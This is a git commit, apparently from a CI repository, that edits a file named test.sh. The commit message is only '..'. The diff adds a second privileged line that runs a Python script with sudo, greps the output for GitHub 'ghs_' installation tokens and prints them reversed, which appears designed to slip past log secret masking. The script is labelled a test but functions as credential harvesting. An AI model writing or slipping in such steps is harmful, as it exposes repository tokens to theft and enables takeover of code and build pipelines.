36e70abcbc9d8355c060e39b3d50707d9124c3c0
Testuser <test@example.com>
2026-03-24 12:15:59 +0100

    ..

--- test.sh
+++ test.sh
@@ -1,4 +1,5 @@
 echo test
 sudo python3 test.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
-sleep 100
+sudo python3 test2.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
+sleep 10
 exit 0
